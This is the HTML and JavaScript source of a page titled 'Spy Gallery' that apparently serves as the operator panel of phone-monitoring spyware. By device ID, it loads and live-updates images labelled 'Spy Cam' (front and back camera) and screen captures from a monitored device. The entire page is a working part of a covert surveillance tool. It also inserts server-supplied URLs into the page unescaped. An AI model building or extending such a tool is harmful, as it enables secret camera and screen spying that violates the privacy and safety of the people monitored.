<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Spy Gallery (Cloudinary Mode)</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>

    <style>
        /* --- DARK THEME STYLES --- */
        * { box-sizing: border-box; }
        body {
            background-color: #0f0f0f;
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: #ffffff;
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 20px;
            min-height: 100vh;
        }

        /* HEADER */
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
        .back-btn {
            background: rgba(255, 255, 255, 0.05); 
            border: 1px solid rgba(255, 255, 255, 0.15);
            color: #fff; padding: 10px 15px; 
            border-radius: 12px; cursor: pointer; text-decoration: none; 
        }
        .page-title { font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }

        /* TABS */
        .tabs-container {
            display: flex; gap: 15px; margin-bottom: 25px;
            background: rgba(255,255,255,0.03); padding: 8px; border-radius: 15px;
        }
        .tab-btn {
            flex: 1; padding: 12px; border: none; background: transparent; 
            color: #666; font-weight: 600; cursor: pointer; transition: 0.3s;
            border-bottom: 2px solid transparent; display: flex; align-items: center; justify-content: center; gap: 8px;
        }
        .tab-btn.active { color: #fff; background: rgba(255,255,255,0.05); border-radius: 10px; }
        .tab-btn[data-target="camera"].active { border-bottom-color: #ff4444; color: #ff4444; }
        .tab-btn[data-target="screen"].active { border-bottom-color: #00f3ff; color: #00f3ff; }

        /* GALLERY GRID */
        .gallery-container {
            display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding-bottom: 20px;
        }
        .img-card {
            background: #000; border-radius: 12px; overflow: hidden; position: relative;
            border: 1px solid rgba(255, 255, 255, 0.15); cursor: pointer; height: 250px; 
            display: flex; align-items: center; justify-content: center;
        }
        .img-card img { 
            width: 100%; height: 100%; object-fit: contain; background-color: #000; 
        }
        .source-badge {
            position: absolute; bottom: 0; left: 0; right: 0;
            background: rgba(0,0,0,0.8); color: #fff; font-size: 0.7rem; padding: 6px; text-align: center;
        }

        /* LOAD MORE */
        .load-more-container { text-align: center; margin-bottom: 50px; margin-top: 20px; }
        .btn-load-more {
            background: #333; color: #fff; border: 1px solid #555;
            padding: 12px 30px; border-radius: 25px; cursor: pointer;
            font-size: 0.95rem; display: inline-flex; align-items: center; gap: 10px;
        }

        .loader {
            border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #00f3ff;
            border-radius: 50%; width: 30px; height: 30px;
            animation: spin 1s linear infinite; margin: 20px auto; display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .status-msg { text-align: center; color: #888; margin-top: 50px; display: none; }

        /* MODAL */
        .modal {
            display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%;
            background-color: rgba(0,0,0,0.95); align-items: center; justify-content: center; flex-direction: column;
        }
        .modal img { max-width: 100%; max-height: 80vh; object-fit: contain; box-shadow: 0 0 20px #000; }
        .modal-actions { margin-top: 20px; display: flex; gap: 20px; }
        .action-btn {
            background: #333; color: #fff; padding: 10px 25px; border-radius: 30px; 
            text-decoration: none; border: 1px solid #555; cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="header">
        <a href="javascript:history.back()" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
        <div class="page-title">Captured Data</div>
        <div style="width: 40px;"></div> 
    </div>

    <div class="tabs-container">
        <button class="tab-btn active" data-target="camera" onclick="switchTab('camera')">
            <i class="fa-solid fa-eye"></i> Spy Cam
        </button>
        <button class="tab-btn" data-target="screen" onclick="switchTab('screen')">
            <i class="fa-solid fa-mobile-screen"></i> Screen Only
        </button>
    </div>

    <div id="loading" class="loader"></div>
    
    <div id="emptyState" class="status-msg">
        <i class="fa-regular fa-folder-open" style="font-size: 2rem; margin-bottom: 10px;"></i><br>
        No captures found.
    </div>

    <div class="gallery-container" id="galleryGrid"></div>

    <div class="load-more-container" id="loadMoreArea" style="display: none;">
        <button class="btn-load-more" onclick="fetchNextPage()">
            Load More <i class="fa-solid fa-arrow-down"></i>
        </button>
    </div>

    <div id="imageModal" class="modal">
        <img id="fullImage" src="">
        <div class="modal-actions">
            <a id="downloadLink" href="#" target="_blank" class="action-btn">
                <i class="fa-solid fa-download"></i> Open Original
            </a>
            <button onclick="closeModal()" class="action-btn">Close</button>
        </div>
    </div>

    <script>
        // ðŸ”¥ AUTO-DETECT SERVER URL
        const API_BASE = window.location.origin; 
        
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id') || localStorage.getItem('monitoring_id');

        let allFilesData = []; 
        let currentFilter = 'camera'; 
        let nextCursor = null; // Cloudinary Pagination Cursor

        // UI Elements
        const galleryGrid = document.getElementById('galleryGrid');
        const loadingSpinner = document.getElementById('loading');
        const emptyState = document.getElementById('emptyState');
        const loadMoreArea = document.getElementById('loadMoreArea');
        const modal = document.getElementById('imageModal');
        const fullImage = document.getElementById('fullImage');
        const downloadLink = document.getElementById('downloadLink');
        const tabs = document.querySelectorAll('.tab-btn');

        // Socket Connection
        const socket = io(API_BASE, { transports: ['websocket', 'polling'] });

        window.onload = function() {
            if(!DEVICE_ID) {
                alert("Device ID Missing!");
                return;
            }
            fetchFiles(); // Initial Load
            setupSocket();
        };

        // ==========================================
        //  1. FETCH DATA (Cloudinary Logic)
        // ==========================================
        function fetchFiles() {
            loadingSpinner.style.display = 'block';
            loadMoreArea.style.display = 'none';

            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}`;
            if (nextCursor) url += `?next_cursor=${nextCursor}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    loadingSpinner.style.display = 'none';
                    
                    // Cloudinary response structure handle karo
                    const newPhotos = data.photos || [];
                    nextCursor = data.next_cursor || null;

                    // Data merge logic
                    newPhotos.forEach(photoUrl => {
                        if (!allFilesData.includes(photoUrl)) {
                            allFilesData.push(photoUrl);
                        }
                    });

                    renderGallery();

                    // Show Load More if cursor exists
                    if (nextCursor) {
                        loadMoreArea.style.display = 'block';
                    }
                })
                .catch(err => {
                    console.error("Fetch Error:", err);
                    loadingSpinner.style.display = 'none';
                });
        }

        function fetchNextPage() {
            if (nextCursor) fetchFiles();
        }

        // ==========================================
        //  2. FILTER & RENDER
        // ==========================================
        function switchTab(category) {
            currentFilter = category;
            tabs.forEach(btn => {
                btn.classList.remove('active');
                if(btn.dataset.target === category) btn.classList.add('active');
            });
            renderGallery();
        }

        function renderGallery() {
            galleryGrid.innerHTML = '';

            const filtered = allFilesData.filter(url => {
                const lowerUrl = url.toLowerCase();
                
                // Hide Gallery previews (icon)
                if (lowerUrl.includes('gallery')) return false;

                // Check type based on Cloudinary Folder/Name
                const isCam = lowerUrl.includes('cam') || lowerUrl.includes('front') || lowerUrl.includes('back');
                
                if (currentFilter === 'camera') return isCam;
                else return !isCam; // Everything else (Screen)
            });

            if (filtered.length === 0) {
                emptyState.style.display = 'block';
            } else {
                emptyState.style.display = 'none';
            }

            filtered.forEach(url => {
                const div = document.createElement('div');
                div.className = 'img-card';
                div.onclick = () => openModal(url);

                let badgeText = "Screen Capture"; 
                if(url.includes('front')) badgeText = "Front Cam";
                else if(url.includes('back')) badgeText = "Back Cam";
                
                div.innerHTML = `
                    <img src="${url}" loading="lazy">
                    <div class="source-badge">${badgeText}</div>
                `;
                galleryGrid.appendChild(div);
            });
        }

        // ==========================================
        //  3. SOCKET (Real-time Cloudinary Updates)
        // ==========================================
        function setupSocket() {
            socket.on('new-file', (data) => {
                if (data.device_id === DEVICE_ID) {
                    // Add new image to top
                    if (!allFilesData.includes(data.url)) {
                        allFilesData.unshift(data.url);
                        renderGallery(); 
                    }
                }
            });
        }

        // ==========================================
        //  4. MODAL
        // ==========================================
        function openModal(url) {
            fullImage.src = url;
            downloadLink.href = url;
            modal.style.display = 'flex';
        }

        function closeModal() {
            modal.style.display = 'none';
            fullImage.src = '';
        }

        // Close on click outside
        modal.addEventListener('click', (e) => {
            if(e.target === modal) closeModal();
        });

    </script>
</body>
</html>
